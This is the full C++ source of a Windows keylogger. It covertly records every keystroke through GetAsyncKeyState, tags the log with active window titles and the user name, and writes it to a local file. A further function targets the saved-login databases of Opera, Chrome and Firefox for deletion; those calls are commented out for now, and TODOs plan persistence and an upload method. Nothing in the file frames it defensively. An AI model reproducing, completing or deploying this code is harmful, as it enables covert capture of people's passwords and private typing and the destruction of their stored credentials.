//Compile: g++ -o keylogger.exe main.cpp -std=c++11 -O2
#include <string>
#include <fstream>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

using namespace std;

struct ENV_INFO {
    string name;
    string user_name;
    string full_name;
    string location;
    DWORD pid;
};

ofstream file;
ENV_INFO env_info;
string windnew, windold, log;

//TODO: uncomment delete file calls
void delete_web_data() {
    string operadatabase = getenv("appdata");
	operadatabase += "\\Opera Software\\Opera Stable\\Login Data";
	//DeleteFile(operadatabase.c_str());

	string chromedatabase = getenv("appdata");
	chromedatabase = chromedatabase.substr(0, chromedatabase.size() - 8);
	chromedatabase += "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
	//DeleteFile(chromedatabase.c_str());

    WIN32_FIND_DATA fileManager;
    string firefoxdatabase = getenv("appdata");
    firefoxdatabase += "\\Mozilla\\Firefox\\Profiles";
    HANDLE hFind = FindFirstFile((firefoxdatabase + "\\*").c_str(), &fileManager);
    if(hFind != INVALID_HANDLE_VALUE) { // If firefox is installed
        do {
            if (fileManager.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                string loc = string(fileManager.cFileName);
                if(loc.find_first_of("default") != -1) { // If directory is a firefox profile folder
                    //DeleteFile((firefoxdatabase + "\\" + loc + "\\logins.json").c_str());
                    //DeleteFile((firefoxdatabase + "\\" + loc + "\\key3.db").c_str());
                    //DeleteFile((firefoxdatabase + "\\" + loc + "\\key4.db").c_str());
                }
            }
        } while(FindNextFile(hFind, &fileManager) != 0);
    }
}

void init(char *argv[]) {
    char tmpBuff[260];

    env_info.name = argv[0];

    GetFullPathName(argv[0], MAX_PATH, tmpBuff, NULL);
    env_info.full_name = string(tmpBuff);

    GetCurrentDirectory(MAX_PATH, tmpBuff);
    env_info.location = string(tmpBuff);

    env_info.pid = GetCurrentProcessId();

    DWORD username_len = 257;
    GetUserName(tmpBuff, &username_len);
    env_info.user_name = string(tmpBuff);
}

string GetActiveWindowTitle() {
	char wnd_title[256];

	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));

	return string(wnd_title);
}

string sysKeys[] = {" ", "[Page Up]", "[Page Down]", "[End]", "[Home]", "[Left]", "[Up]", "[Right]", "[Down]", "", "", "", "[Print Screen]", "[Insert]", "[Del]"}; // 32 - 46
char numbers[] = "0123456789";
char special[] = ")!@#$%^&*(";
char numpad[] = "0123456789*& -./";
char otherNorm[] = ";=,-./`                          [\\]\'";
char otherShif[] = ":+<_>?~                          {|}\"";
//TODO: On <Ctrl>-C get content of the buffer and save it to the log
void logKeys() {
    for(int i = 8, t; i < 222; i++) {
        if(GetAsyncKeyState(i) != -32767) continue;

        switch (i) {
            case 8: // Del last Symbol
                log = log.substr(0, log.length() - 1);
                break;
            case 9:
                log += "[TAB]";
                break;
            case 13:
                log += "\n";
                break;
            case 17:
                log += "[Ctrl]";
                break;
            case 27:
                log += "[Esc]";
                break;
            case 32: case 33: case 34: case 35: case 36: case 37: case 38: case 39: case 40: case 44: case 45: case 46:
                log += sysKeys[i-32];
                break;
            case 145:
                log += "[Scroll Lock]";
                break;
            case 48: case 49: case 50: case 51: case 52: case 53: case 54: case 55: case 56: case 57:
                log += GetKeyState(VK_SHIFT) < 0 ? special[i-48] : numbers[i-48];
                break;
            case 65: case 66: case 67: case 68: case 69: case 70: case 71: case 72: case 73: case 74: case 75: case 76: case 77: case 78: case 79: case 80: case 81: case 82: case 83: case 84: case 85: case 86: case 87: case 88: case 89: case 90:
                t = tolower((char)i); //to lower case;
                if(GetKeyState(VK_CAPITAL) == 1) t ^= 32; // Flip case if CapsLk is on
                if(GetKeyState(VK_SHIFT) < 0) t ^= 32; // Flip case if Shift is down
                log += (char)t;
                break;
            case 96: case 97: case 98: case 99: case 100: case 101: case 102: case 103: case 104: case 105: case 106: case 107: case 109: case 110: case 111:
                log += numpad[i-96];
                break;
            case 144:
                log += "[Num Lock]";
                break;
            case 112: case 113: case 114: case 115: case 116: case 117: case 118: case 119: case 120: case 121: case 122: case 123:
                log += ("[F" + to_string(i - 111) + "]");
                break;
            case 186: case 187: case 188: case 189: case 190: case 191: case 192: case 219: case 220: case 221: case 222:
                log += GetKeyState(VK_SHIFT) < 0 ? otherShif[i-186] : otherNorm[i-186];
                break;
            default:
                break;
        }
    }
}

bool didWindowChange() {
    windnew = GetActiveWindowTitle();
    if (windnew != windold && windnew != "") {
        windold = windnew;
        return true;
    }

    return false;
}

bool isLogFull() {
    return (log.size() >= 1024); // is size is over a kilobyte
}

void logger() {
    bool winChange = didWindowChange();
    bool isFull = isLogFull();

    //TODO: write to file in a thread
    if(isFull && winChange) { // time to write to file
        file.open("temp.txt", ofstream::out | ofstream::app);
        file << log;
        file.close();

        log.clear();
    }

    if(winChange) {
        log += "\n\n(Window: " + windnew + ")\n";
    }

    logKeys();
}

//TODO: add persistance
//TODO: add upload method
int main(int argc, char *argv[]) {
    init(argv);
    delete_web_data();

    log += env_info.user_name + "\n";

    while(1) {
        logger();
        Sleep(10);
    }

    return 0;
}
